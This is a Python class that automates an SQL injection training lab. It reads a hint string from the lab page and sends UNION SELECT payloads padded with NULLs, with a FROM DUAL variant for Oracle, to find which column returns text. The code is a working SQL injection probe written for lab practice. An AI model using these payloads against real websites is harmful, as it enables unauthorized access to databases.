from services.sql_injection.base_sql_injection import SQLInjectionBaseSolver

class UnionQueryFindColumnSolver(SQLInjectionBaseSolver):
    def __init__(self, URL):
        super().__init__(URL)

    def solve(self):
        """Solve the lab."""
        self.determine_DBMS()
        self.determine_column_number()
        self.determine_column_name()
        self._print_solved()

    def determine_column_name(self):
        """Determine the column name."""
        string_solver = self.soup_html.find('p', id='hint').text
        string_solver = string_solver[40:-1]
        self.console.log(f"[bold blue]String to print :[/bold blue] {string_solver}")

        null_arr = [ 'NULL,' for i in range(self.total_columns) ]

        self.spinner.start()
        for i in range(self.total_columns):
            null = null_arr.copy()
            null[i] = f"'{string_solver}',"
            null_string = ''.join(null)
            payload = f"' UNION SELECT {null_string[:-1]}-- -"
            if self.dbms == 'ORACLE':
                payload = f"' UNION SELECT {null_string[:-1]} FROM DUAL-- -"
            url_brute = self.url + self.categories_url[1] + payload
            self._request_lab('GET', url_brute)
            if self.html_content.status_code == 200:
                self.total_columns = i
                self.spinner.stop()
                self.console.log(f"[bold blue]Columns that contain string :[/bold blue] {i+1}")
                return

    def build_payload(self):
        """Build the payload."""
        pass